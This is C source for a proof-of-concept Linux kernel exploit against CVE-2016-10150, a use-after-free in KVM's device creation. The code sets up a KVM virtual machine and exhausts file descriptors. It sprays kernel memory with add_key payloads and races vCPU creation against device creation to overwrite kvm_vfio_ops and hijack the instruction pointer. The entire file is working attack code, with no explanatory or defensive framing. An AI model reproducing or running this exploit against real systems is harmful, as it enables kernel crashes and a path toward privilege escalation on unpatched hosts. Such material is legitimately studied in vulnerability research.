/*
 * A proof-of-concept demonstrating ip control for cve-2016-10150, modified from ww9210's exploit
 * author: Lewis_Chen_
 * at least works for v4.8
 */
#include <stdio.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <linux/kvm.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include "libexp.h"

#define THREADS_NUM 10
#define CRASH_IP 0xffffffffdeadbeef
#define ADDR 0xffffffff82423f60// kvm_vfio_ops
#define FAKE_DEV 0x41000
#define FAKE_NEXT 0x41414141
#define FAKE_PREV 0x42424242

//==globals
int dev=-1;
int vmfd;
long *fake_dev;
char payload[0x40];
int *stage;
long *fake_ops;
//==end of globals

void context_setup(void)
{
	int file_fd[2048];
	int fd;
	int ret;

	// open kvm dev 
	dev = open("/dev/kvm", O_RDWR|O_CLOEXEC);
	if (dev < 0) {
		perror("fail to open kvm");
		exit(1);
	}

	// create a VM first
	vmfd = ioctl(dev, KVM_CREATE_VM, (unsigned long)0);
	if (vmfd < 0) {
		perror("create vm");
		exit(1);
	}

	// create userspace region
	void *mem = umem_alloc(NULL, 0x1000);
	memset(mem, 0xcc, 0x1000);
	struct kvm_userspace_memory_region region = {
		.slot = 0,
		.guest_phys_addr = 0x1000,
		.memory_size = 0x1000,
		.userspace_addr = (uint64_t)mem,
	};
	ret = ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &region);
	if(ret) error_out("set user memory error");

	// to fail anon_inode_getfd??
	for (int j = 0;; j++) {
		fd = open("/tmp/1",O_WRONLY|O_CREAT);
		if(fd < 0) break;
		file_fd[j]	= fd;
	}
}

void spray_func(void)
{
	while(1) {
		while(*stage == 0) usleep(0);
		syscall(__NR_add_key, "user", "wtf", payload, 0x16, -2);
		*stage = 0;
	}
}

void create_vcpu_func(void)
{
	while(1) {
		ioctl(vmfd, KVM_CREATE_VCPU, (unsigned long)0);
	}
}

void payload_setup(void)
{
	// write-what-where
	long *ptr = (long *)(&payload[6]);
	ptr[0] = ADDR;
	ptr[1] = CRASH_IP;

	// setup stage
	stage = (int *)mmap((void *)0x20000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON | MAP_FIXED, -1, 0);
	if(stage != (void *)0x20000) error_out("stage");
	*stage = 0;

	// launch spray subprocess
	for(int i=0; i<1; i++) {
		if(!clean_fork()) {
			setsid();
			spray_func();
			while(1);
		}
	}

	// create a process to race for the kvm global lock
	if(!clean_fork()) {
		setsid();
		while(1) create_vcpu_func();
	}
}

void trigger(void)
{
	struct kvm_create_device cd = {0};
	cd.type = KVM_DEV_TYPE_VFIO;
	cd.flags = 0;

	*stage = 1;
	ioctl(vmfd, KVM_CREATE_DEVICE, &cd);
	while(*stage == 1) usleep(0);
}

int main() {
	payload_setup();
	context_setup();

	defragment(0x40, 0x100);

	for(int i = 0; i < 0x100000; i++) {
		trigger();
	}
	return 0;
}
